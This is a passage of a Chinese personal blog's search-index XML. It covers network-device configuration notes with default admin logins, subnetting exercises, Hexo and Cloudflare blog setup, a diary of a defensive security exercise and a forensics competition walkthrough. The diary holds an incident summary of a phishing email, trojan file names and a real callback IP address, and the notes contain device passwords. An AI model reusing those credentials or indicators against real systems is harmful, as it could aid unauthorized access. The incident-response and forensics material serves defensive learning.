+<p><strong>链路聚合配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface aggregate1</span><br><span class="line">zone trust</span><br><span class="line">manage ping</span><br><span class="line">lacp enable</span><br><span class="line">exit</span><br><span class="line">interface aggregate1.113</span><br><span class="line">zone trust</span><br><span class="line">manage ping</span><br><span class="line">ip address 192.168.0.1/24</span><br><span class="line">interface aggregate1.114</span><br><span class="line">zone trust</span><br><span class="line">manage ping</span><br><span class="line">ip address 192.168.0.2/24</span><br><span class="line">exit</span><br><span class="line">interface e0/1</span><br><span class="line">aggregate aggregate1</span><br><span class="line">interface e0/2</span><br><span class="line">aggregate aggregate1</span><br><span class="line">show configuration  interface  aggregate1</span><br></pre></td></tr></table></figure>
+
+<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable</span><br><span class="line">config</span><br><span class="line">hostname CS</span><br><span class="line">vlan xx;xx;xx</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置IP</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipv6 enable</span><br><span class="line">interface vlan xx</span><br><span class="line">ipv6 enable </span><br><span class="line">ip ad 192.168.0.1/24</span><br><span class="line">ipv6 ....</span><br></pre></td></tr></table></figure>
+
+<p><strong>捆绑vlan</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int e1/0/1</span><br><span class="line">sw ac vlan  xx</span><br><span class="line">int e1/0/2</span><br><span class="line">sw mode trunk</span><br><span class="line">sw trunk all vlan 140;150 </span><br><span class="line">sw trunk native vlan 11 此时管理vlan就是11 140;150是通过此端口的vlan就比如vlan140;150是APvlan</span><br></pre></td></tr></table></figure>
+
+<p><strong>链路聚合配置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">port-group  1 </span><br><span class="line">interface ethernet  1/0/1-2</span><br><span class="line">port-group 1 mode active 主动模式</span><br><span class="line">interface  port-channel 1 </span><br><span class="line">switchport mode trunk 设置为trunk端口，看题目而定，access可不设置</span><br><span class="line">switchport trunk allowed vlan 100</span><br></pre></td></tr></table></figure>
+
+<h3 id="WS"><a href="#WS" class="headerlink" title="WS"></a>WS</h3><p>同CS配置一样</p>
+<h3 id="BC"><a href="#BC" class="headerlink" title="BC"></a>BC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.0.1:9090 </span><br><span class="line">admin</span><br><span class="line">admin*PWD</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 改名</span><br><span class="line">2. 增加安全策略</span><br><span class="line">3. 配置端口、IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619184833754-1912863813.png" alt="image-20240619184834859"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619184849177-962736332.png" alt="image-20240619184850332"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619184905358-1318996520.png" alt="image-20240619184906940"></p>
+<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://192.168.254.1</span><br><span class="line">admin</span><br><span class="line">yunke1234!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 改名</span><br><span class="line">2. 配置端口、IP、默认路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619184952246-32313762.png" alt="image-20240619184953903"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619185000429-1283664333.png" alt="image-20240619185002200"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619185009251-1309281478.png" alt="image-20240619185010997"></p>
+<h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p>首先要明白主机IP32位由 网络位+主机位构成<br>二进制计算：<br>0  |0 |0 |0 |0|0|0|0<br>128|64|32|16|8|4|2|1 相加就是255</p>
+<p>网络地址：192.168.0.0&#x2F;24<br>广播地址：192.168.0.255&#x2F;24<br>网络地址是主机号全为0<br>广播地址是主机号全为1<br>比如192.168.0.1&#x2F;24二进制表达就是<br>主机： 11000000 10101000 00000000 00000001<br>掩码： 11111111 11111111 11111111 00000000<br>子网： 11000000 10101000 00000000 00000000<br>主机掩码变化到子网就是同1化1，异化0<br>根据子网算出网络地址和广播地址<br>子网： 11000000 10101000 00000000 | 00000000 #因为掩码是24所以前24位是固定的，变化的都是<br>主机号<br>      —-     网络位          —| –主机位–<br>网络地址：192.168.0.0&#x2F;24<br>广播地址：192.168.0.255&#x2F;24</p>
+<h3 id="解决思路："><a href="#解决思路：" class="headerlink" title="解决思路："></a>解决思路：</h3><p><strong>第一步：</strong>找出题目中给出的网络号<br><strong>第二部：</strong>计算出网络地址和广播地址 #目的就是划分网络不超出这个范围<br><strong>第三步：</strong>进行子网划分，遵循从大到小原则，先算大，再算小<br><strong>第四步：</strong>通过子网掩码计算可用主机数量<br><strong>第五步：</strong>从大到小计算网络地址和广播地址</p>
+<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>某公司获得了一个 IP 地址段为172.16.24.0&#x2F;23 的网络。该公司需要将这个网络划分为多个子网以满足不<br>同部门的需求。根据给定的要求，请回答以下问题：<br>公司有三个部门，各部门所需最少子网地址数量，销售（60）、技术（10）、营销（129）<br>基于上述划分，确定每个子网的子网掩码、网络地址范围和广播地址</p>
+<p><strong>第一步：</strong>172.16.24.0&#x2F;23<br><strong>第二部：</strong>自己按照上面提示求出子网<br>子网：10101100 00010000 00011000 00000000<br>这次掩码变为23了，所以主机位就是9，前23位不动，后9位变化<br>子网：10101100 00010000 0001100|0 00000000—<br>            —              网络位                   —|—    主机位  —<br>网络地址：172.16.24.0&#x2F;23<br>广播地址：172.16.25.255&#x2F;23<br><strong>第三步：</strong>先算营销、再销售、再技术<br><strong>第四步：</strong>营销所需129个 销售所需60 技术所需10个 +2是因为.0和.255不可用就是网络地址和广播地址不<br>可用</p>
+<p>2的x的平方&gt;&#x3D;129+2 x&gt;&#x3D;8 32-8&#x3D;24 所以营销部门子网掩码就是24</p>
+<p>2的x的平方&gt;&#x3D;60+2 x&gt;&#x3D;6 32-6&#x3D;26 所以销售部门子网掩码就是26 </p>
+<p>2的x的平方&gt;&#x3D;10+2 x&gt;&#x3D;4 32-4&#x3D;28 所以技术部门子网掩码就是28</p>
+<p><strong>第五步：</strong><br><strong>1.营销：</strong>172.16.24.0&#x2F;24<br> 172.16.24.00000000<br>网络-广播：172.16.24.0-172.16.24.255&#x2F;24<br>可用主机：172.16.24.1-172.16.24.254<br>因为172.16.24.0&#x2F;24的地址均用完，接下来就要使用172.16.25.0网段</p>
+<p><strong>2.销售：</strong>172.16.25.0&#x2F;26<br> 172.16.24.00|000000<br>网络-广播：172.16.25.0-172.16.25.63&#x2F;26<br>可用主机：172.16.25.1-172.16.25.62&#x2F;26<br> <strong>3.技术：</strong>172.16.25.64&#x2F;28<br> 172.16.24.0100|0000<br>网路-广播：172.16.25.64-172.16.25.79&#x2F;28<br>可用主机：172.16.25.65-172.16.25.78&#x2F;28</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>博客配置</title>
+    <url>/posts/459ba203.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="插入音乐"><a href="#插入音乐" class="headerlink" title="插入音乐"></a>插入音乐</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=416892296&auto=0&height=66"></iframe>
+
+<p>网易云找到需要插入的音乐，进入图片界面，点击生成外链播放器</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609220349515-1715996838.png" alt="image-20240609220348450"></p>
+<p>可选择是否自动播放</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609220433508-344574955.png" alt="image-20240609220433503"></p>
+<p>音乐代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=2&amp;id=416892296&amp;auto=0&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关于图床不能正常显示"><a href="#关于图床不能正常显示" class="headerlink" title="关于图床不能正常显示"></a>关于图床不能正常显示</h2><p>在md文章顶部输入</p>
+<meta name="referrer" content="no-referrer">
+
+<p>例子：</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609220736493-1958683140.png" alt="image-20240609220735192"></p>
+<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><strong>正式开始部署之前我们需要明白：</strong></p>
+<ul>
+<li>站点配置文件：位于站点根目录下，基于网站的配置</li>
+<li>主题配置文件：位于<code>themes</code>目录下，基于主题相关配置</li>
+</ul>
+<p>在博客根目录文件夹下打开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609222908550-1908865020.png" alt="image-20240609222908329"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+
+<p>注意：git方式下载为最新版本（下载报错一般是github连接不到，网上教程配置下加速解决），需要其他版本可去<a href="https://github.com/theme-next/hexo-theme-next/releases">next官网</a>下载压缩包解压到themes下即可</p>
+<p><strong>启用主题：</strong></p>
+<p>与其他主题启用模式相同，打开站点配置文件，找到<code>themes</code>，修改成自己的主题文件夹命名</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609224045428-1170978313.png" alt="image-20240609224045350"></p>
+<p><strong>验证：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean <span class="comment">#生成缓存</span></span><br><span class="line">hexo g <span class="comment">#生成文件</span></span><br><span class="line">hexo s<span class="comment">#本地服务进行测试</span></span><br><span class="line">hexo d <span class="comment">#上传到github</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="comment">#网站的标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span> <span class="comment">#网站副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;&#x27;</span> <span class="comment">#网站描述</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="comment">#网站关键字</span></span><br><span class="line"><span class="attr">author:</span> <span class="comment">#网站作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment">#语言 zh-CN简体中文</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span> <span class="comment">#时区</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new 文章</span><br><span class="line">hexo new <span class="string">&quot;hello jack&quot;</span><span class="comment">#文章标题有空格的条件下</span></span><br></pre></td></tr></table></figure>
+
+<p>清空缓存，生成，上传</p>
+<p><strong>分类：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;categories&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>source</code>内会出现categories文件夹，配置文件index.md</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609225036377-1664229931.png" alt="image-20240609225036464"></p>
+<p>以此类推</p>
+<p><strong>标签：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关于：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>博客配置</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>基于github+Cloudflare搭建个人博客</title>
+    <url>/posts/2f7875ad.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<p>本次搭建</p>
+<p>服务器：github（免费）</p>
+<p>域名：阿里云，西部数码等等（需要付费，第一年大概12左右）</p>
+<p>如果想白嫖搭建到博客上线步骤暂停</p>
+<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>以下工具安装必应搜索网上一堆教程</p>
+<p>node</p>
+<p>git</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v（这个是node附带的）</span><br><span class="line">git -v</span><br></pre></td></tr></table></figure>
+
+<p>下载hexo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<h2 id="搭建仓库"><a href="#搭建仓库" class="headerlink" title="搭建仓库"></a>搭建仓库</h2><p>github新建仓库</p>
+<p>仓库名一定要设置<code>用户名.github.io</code></p>
+<p>勾选public公共</p>
+<p>勾选Add a READNE file</p>
+<h2 id="生成SSH-Keys"><a href="#生成SSH-Keys" class="headerlink" title="生成SSH Keys"></a>生成SSH Keys</h2><p>任意位置打开<code>open git bash here</code>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure>
+
+<p>回车4次</p>
+<p>进入<code>C:\Users\Lenovo\.ssh</code>目录</p>
+<p>复制<code>id_rsa.pub</code>文件代码</p>
+<p>再打开github，设置，sshkeys</p>
+<p>名称随意，代码粘贴到下面创建</p>
+<p><strong>测试是否成功</strong></p>
+<p><code>git bash</code>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+<p>yes</p>
+<h2 id="生成本地博客内容"><a href="#生成本地博客内容" class="headerlink" title="生成本地博客内容"></a>生成本地博客内容</h2><p>确定位置新建blog文件夹，进入打开<code>git bash</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p>若出现<code>‘command not find’</code>，就在命令前加入npx</p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo install #安装</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo s #本地加载</span><br></pre></td></tr></table></figure>
+
+<h2 id="博客上线"><a href="#博客上线" class="headerlink" title="博客上线"></a>博客上线</h2><p>打开站点配置<code>_config.yml</code></p>
+<p>注意缩进两个空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: </span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
+
+<p>仓库，code，复制https，复制到repository: 注意与冒号之间有空格</p>
+<p>安装自动部署工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p>配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;你的邮箱&quot;</span><br><span class="line">git config --global user.name &quot;你的名字&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再次生成，上传</p>
+<p>此时就算搭建成功，网址为：用户名.github.io</p>
+<h2 id="cloudflare部署"><a href="#cloudflare部署" class="headerlink" title="cloudflare部署"></a>cloudflare部署</h2><p>Github提供的网址在国内的访问速度较慢，再通过绑定域名方法会很快</p>
+<p>Vercel和cloudflare作用相同，但是目前Vercel被国内设墙，部分用户可以访问，部分不行，需要搭梯子，导致不能所有用户访问。（Vercel方法随缘，有的人可以全国访问，而我的就不行，Vercel教程<a href="https://blog.fiveth.cc/p/138e/">Hexo搭建进阶：Vercel部署、主题安装、基础用法 (fiveth.cc)</a>）</p>
+<p>不习惯英语可以修改为中文，对于学生来说还是推荐english，多熟悉熟悉英语，以后工作更方便</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232010147-300554834.png" alt="image-20240609232009691"></p>
+<p>点击workers-and-pages进行创建</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232123938-2087969152.png" alt="image-20240609232123559"></p>
+<p>点击pages，连接git，</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232328923-371863785.png" alt="image-20240609232328581"></p>
+<p>选择我们创建的github仓库</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232417450-646256914.png" alt="image-20240609232417384"></p>
+<p>按照提示继续，目前的网址就更新为项目名称.pages.dev</p>
+<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><p>点击刚部署好的网站</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232633972-113818485.png" alt="image-20240609232633677"></p>
+<p>选择自定义域名，按照提示进行操作即可</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609232738778-1698844123.png" alt="image-20240609232738669"></p>
+<p>自此免费服务器+自定义域名搭建成功</p>
+]]></content>
+      <categories>
+        <category>博客配置</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>国护Vlog</title>
+    <url>/posts/28501.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="7-19到达北京"><a href="#7-19到达北京" class="headerlink" title="7.19到达北京"></a>7.19到达北京</h2><p>初次到达北京，一堆事情等着处理，公司录入人脸，找租房，临时放置行李</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807195807251-743682269.jpg" alt="1"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807195459368-1517151418.png" alt="image-20240807195323145"></p>
+<p>拖着行李箱在北京街头游荡，找了家KFC临时休息会，害怕别人给我赶出来特意点了份套餐，现在想想当时也是爱面子，你不买东西人家也不会赶你走</p>
+<p>没找到小超市，在附近问了一家家商铺，说把行李箱临时放一会，一直拒绝，刚开始问的时候还扭扭捏捏，后面越问越不慌张，毕竟也理解，都是打工人店里客流量也大，不想因为小钱担责任，后面遇到一位善良的药店姐姐，将手机号留在那就匆匆去公司录人脸</p>
+<p>到公司被保安卡了，质问我长期还是临时访问，当时给我搞蒙圈了，客户也没给我报备姓名，最后项目经理来接我上去才通过。由于客户还没来得及给我报备，办了个临时的，人脸还需要明天再来一趟，到了刚好熟悉下工作流程</p>
+<p>第二天继续去公司录入人脸培训，北京地铁与郑州地铁区别就是换乘，北京地铁换乘举例将近600多米，有点离谱了，第一次从住宿的地方计算了下将近一小时十分钟，因为住宿的地方在五环外面了，所以通勤时间比较久，熟悉工作内容，写word，整理excel，结束一天的工作</p>
+<p>总结就是：万事开头难</p>
+<h2 id="8-02"><a href="#8-02" class="headerlink" title="8.02"></a>8.02</h2><p>在北京生活，消费高，吃饭也贵，干什么都贵，没钱啊，我就天天看哪个外卖最便宜，就是为了省点，这个省下的钱还是花到我身上了，当时给我气的，又没吃好又得了病难受的，去诊所人生地不熟，被宰了75，吃完药还是鼻塞，又在美团买了50的药，来来回回将近也花了150，自那日以后就该吃吃该喝喝了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807223543400-249076839.png" alt="image-20240807223438738"></p>
+<p>最后啊，知道了现场甲方有食堂，也不用吃那些明知道是预制饭还得买的外卖了，平常不忙的话也可以去甲方食堂去吃，很健康</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807201227736-490059827.png" alt="image-20240807201157749"></p>
+<p>甲方也开始买零食了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807201741663-1655411256.png" alt="image-20240807201731351"></p>
+<p>暂时先到这吧</p>
+<h2 id="8-19"><a href="#8-19" class="headerlink" title="8.19"></a>8.19</h2><p>终于熬过一个月了，还好有甲方零食安慰，再坚持一月</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240821212643099-2050962332.png" alt="image-20240821212514203"></p>
+<h2 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h2><p>突然通知要结束了，回光返照一样，这边预约的景点逛完手机就来消息项目要结束了<br> <img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831102200862-1041307859.png" alt="image-20240831102121126"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831103243716-1091537246.png" alt="image-20240831103210975"><br>一个人在外面，踩了很多雷，都是历练了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="HVV突发钓鱼事件"><a href="#HVV突发钓鱼事件" class="headerlink" title="HVV突发钓鱼事件"></a>HVV突发钓鱼事件</h3><p>27日下午收到电话，财务处收到“税务抽查通知”的可以邮件，经过排查相关人员点击附件图片，未访问图片内木马程序链接，调取网络日志与终端日志，确认其中一人尝试访问木马下载链接，但由于其及时关机，攻击人员服务器为自建阿里云服务器，网络较慢未完成下载运行过程，暂未发现攻击成功迹象</p>
+<p>开展排查时间对已接受邮件进行断网，防止重启自动联网</p>
+<p>使用安恒设备进行查看分析时间段内异常内向外流量，对设备导出被钓鱼邮件时间段内及终端的原始日志，分析外连IP</p>
+<blockquote>
+<p> 同时发现安恒监控设备时间与网络时间相差，使用NTA平台重启设备更新时间</p>
+</blockquote>
+<p>目前分析gif文件应该没问题，gif里面那个链接，点击以后会下载一个9m多的压缩包，里面是一个23m左右的exe文件</p>
+<p><code>35lduXzQ.rar</code>解压后释放<code>35lduXzQ.exe</code>，<code>35lduXzQ.exe</code>主程序释放了一个 <code>t0mcat.exe</code> ，这个程序执行又释放了几个dll，然后回连137.59.16.4。</p>
+<p>同时对回连木马地址进行封禁</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>图床搭建(零成本)</title>
+    <url>/posts/afaa72b6.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>使用typora发布博客以及发送给朋友md文档需要打包成压缩包，csdn还无法解码url，</p>
+<p>于是搭建免费版github+pic图床，但github图床限制1G，超过就会有人工审核，并且传输不稳定，时好时坏</p>
+<p>七牛虽然高速，但免费时长只有一月，超过需要绑定域名，（域名便宜的大概12一年）</p>
+<p>阿里和腾讯都需要收费</p>
+<h3 id="1-创建博客园账号"><a href="#1-创建博客园账号" class="headerlink" title="1.创建博客园账号"></a>1.创建博客园账号</h3><p>软件exe基于博客园使用</p>
+<p>管理-设置-其他设置</p>
+<p>需要设置令牌</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233056234-253989091.png" alt="image-20240609233055768"></p>
+<h3 id="2-下载exe"><a href="#2-下载exe" class="headerlink" title="2.下载exe"></a>2.下载exe</h3><p>注意：！！！安装路径不要带有中文路径</p>
+<p><a href="https://www.123pan.com/s/YiNWjv-b5fa3.html%E6%8F%90%E5%8F%96%E7%A0%81:48Oh">https://www.123pan.com/s/YiNWjv-b5fa3.html提取码:48Oh</a></p>
+<p>进行配置</p>
+<p>id是作者名称</p>
+<p>账号就是登录名</p>
+<p>密码就是令牌</p>
+<p>地址是metaweblog地址</p>
+<p>设置错误也没关系，按1重置，慢慢来就会成功</p>
+<h3 id="3-配置typora"><a href="#3-配置typora" class="headerlink" title="3.配置typora"></a>3.配置typora</h3><p>文件-偏好设置-图像</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233259076-2096031584.png" alt="image-20240609233258532"></p>
+<p>命令为.exe软件位置（再次提醒不要安装在中文路径）</p>
+<p>比如我的位置是D:\Tool\EasyBlogImageForTypora\EasyBlogImageForTypora.exe</p>
+<p>点击验证测试</p>
+<p>到此，免费图床就配置好了，祝各位前途无忧</p>
+]]></content>
+      <categories>
+        <category>博客配置</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>数字取证</title>
+    <url>/posts/21993.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="任务三：数字文件取证"><a href="#任务三：数字文件取证" class="headerlink" title="任务三：数字文件取证"></a>任务三：数字文件取证</h2><table>
+<thead>
+<tr>
+<th align="center">证据编号</th>
+<th align="center">在取证镜像中的文件名</th>
+<th align="center">镜像中原文件Hash码（MD5，不区分大小写）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">evidence 1</td>
+<td align="center">eg2kx.jpg</td>
+<td align="center">85cdf73518b32a37f74c4bfa42d856a6</td>
+</tr>
+<tr>
+<td align="center">evidence 2</td>
+<td align="center">ZQOo2.zip</td>
+<td align="center">9e69763ec7dac69e2c5b07a5955a5868</td>
+</tr>
+<tr>
+<td align="center">evidence 3</td>
+<td align="center">p3qQ4.jpg</td>
+<td align="center">a9a18aecec905a7742042461595b4b5c</td>
+</tr>
+<tr>
+<td align="center">evidence 4</td>
+<td align="center">nsOh2.png</td>
+<td align="center">f5b9ce3e485314c23c40a89d994b2dc8</td>
+</tr>
+<tr>
+<td align="center">evidence 5</td>
+<td align="center">RVlYt.zip</td>
+<td align="center">3f67593f11669c72a36bad4d41a83a78</td>
+</tr>
+<tr>
+<td align="center">evidence 6</td>
+<td align="center">mkjRv.7z</td>
+<td align="center">e610fcd2a0cd53d158e8ee4bb088100a</td>
+</tr>
+<tr>
+<td align="center">evidence 7</td>
+<td align="center">OR8iq.xml</td>
+<td align="center">28ba933c31fd60f8c4461aed14a8c447</td>
+</tr>
+<tr>
+<td align="center">evidence 8</td>
+<td align="center">8cFQj.py</td>
+<td align="center">7fccfb1778b15fbc09deb6690afc776a</td>
+</tr>
+<tr>
+<td align="center">evidence 9</td>
+<td align="center">jMH7w.xlsx</td>
+<td align="center">523c407180d54dde6eca700405599c8a</td>
+</tr>
+<tr>
+<td align="center">evidence 10</td>
+<td align="center">01d98.gif</td>
+<td align="center">d708444963b79da344fd71e5c72f7f02</td>
+</tr>
+</tbody></table>
+<h3 id="evidence-1"><a href="#evidence-1" class="headerlink" title="evidence 1"></a>evidence 1</h3><p>在auto中找到eg2kx.jpg，保存到本地</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144320915-1400398092.png" alt="image-20240619144319921"></p>
+<p>放到kali里查看下文件，发现里面有个压缩包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144343298-1732351595.png" alt="image-20240619144344786"></p>
+<p>后缀修改.zip，打开压缩包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144358900-1499432232.png" alt="image-20240619144400692"></p>
+<p>certutil -hashfile filename md5 使用cmd终端求出源文件hash码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144422045-534872133.png" alt="image-20240619144423655"></p>
+<h3 id="evidence-2"><a href="#evidence-2" class="headerlink" title="evidence 2"></a>evidence 2</h3><p>ZQOo2.jpg用kali分析</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144448282-781821382.png" alt="image-20240619144450039"></p>
+<p>修改成zip文件需要密码，拉到010修改参数</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144530235-441168608.png" alt="image-20240619144531862"></p>
+<h3 id="evidence-3"><a href="#evidence-3" class="headerlink" title="evidence 3"></a>evidence 3</h3><p>p3qQ4.jpg</p>
+<p>打开就是图片没显示完全 </p>
+<p>HEX 十六进制 </p>
+<p>DEC 十进制 </p>
+<p>OCT 八进制 </p>
+<p>BIN 二进制 </p>
+<p>00 00 02 80 代表宽度 </p>
+<p>00 00 01 92 代表高度</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144801830-207600106.png" alt="image-20240619144803532"></p>
+<p>将高度十进制修改成1000，十六进制就是03 E8</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144821301-1590599293.png" alt="image-20240619144822803"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144836124-1454248698.png" alt="image-20240619144837626"></p>
+<h3 id="evidence-4"><a href="#evidence-4" class="headerlink" title="evidence 4"></a>evidence 4</h3><p>nsOh2.png 直接显示了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144902699-273714854.png" alt="image-20240619144904197"></p>
+<h3 id="evidence-5"><a href="#evidence-5" class="headerlink" title="evidence 5"></a>evidence 5</h3><p>RVlYt.zip</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145022732-277350086.png" alt="image-20240619145024416"></p>
